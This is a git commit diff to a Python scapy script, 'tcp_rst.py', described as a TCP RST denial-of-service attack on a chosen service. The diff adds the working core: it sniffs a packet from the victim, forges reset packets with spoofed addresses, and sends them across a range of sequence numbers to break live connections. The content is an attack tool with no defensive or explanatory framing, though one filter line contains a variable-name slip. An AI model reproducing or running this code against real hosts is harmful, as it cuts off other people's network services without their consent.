bc73d5872d9e6ef205f6f96dc0aa37e6bf802ce9
s33r <acow777@gmail.com>
2019-01-03 21:18:23 -0800

    prototype built

--- tcp_rst.py
+++ tcp_rst.py
@@ -2,10 +2,9 @@
 -----TCP RST Attack-----
 Filename: tcp_rst.py
 Author: s33r
-Description: DOS for a particular service running on a particular port
+Description: Theoretical DOS for a particular service running on a particular port
              via tcp rst packets that attempt to increment seq number 
              to prevent proper communication
-
 '''
 
 import sys
@@ -15,23 +14,36 @@ from scapy import *
 
 
 interface = cfg.interface
-
+window_size = 512
+attack_tries = 15
+     
 def sniff_packet_stream(victim_ip, victim_port):
     #sniff a packet with given ip and port from victim
     pack = sniff(iface=interface, count=1, 
-            lfilter= lambda x: x.haslayer(TCP) 
-            and x[IP].src == victim_ip
-            and t[TCP].sport == victim_port)
+             lfilter= lambda x: x.haslayer(TCP) 
+             and x[IP].src == victim_ip
+             and t[TCP].sport == victim_port)
 
     return pack
 
-def tcp_reset_attack(p, victim_ip, victim_port):
+def tcp_reset_attack(sniffed_packet, victim_ip, victim_port):
     #sniffed packet passed in as p
     try:
-        while True:
-            print("[*] Starting TCP Reset Attack")
+        print("[*] Starting TCP Reset Attack")
 
+        p = sniffed_packet[0] #cleaner syntax for scapy command 
+        pack = IP(src=p[IP].dst, dst=p[IP].src) / \
+                 TCP(sport=p[TCP].dport, dport=p[TCP].sport, flags='R', window=window_size)
+ 
+        #set up seq in window of victim service
+        max_seq_num = window_size * attack_tries + p[TCP].ack
+        sequence_numbers = range(p[TCP].ack, max_seq_num, int(window_size / 2))
+            
+        for s in sequence_numbers:
+            pack.seq = s
+            send(pack, verbose=0, iface=interface)
         
+        print("[*] TCP Reset Attack Finished")
 
     except KeyboardInterrupt:
         print("[*] Stopping TCP Reset Attack")
@@ -47,6 +59,3 @@ if __name__ == '__main__':
 
     sniffed_packet = sniff_packet_stream(victim_ip, victim_port)
     tcp_reset_attack(sniffed_packet, victim_ip, victim_port)
-
-
-
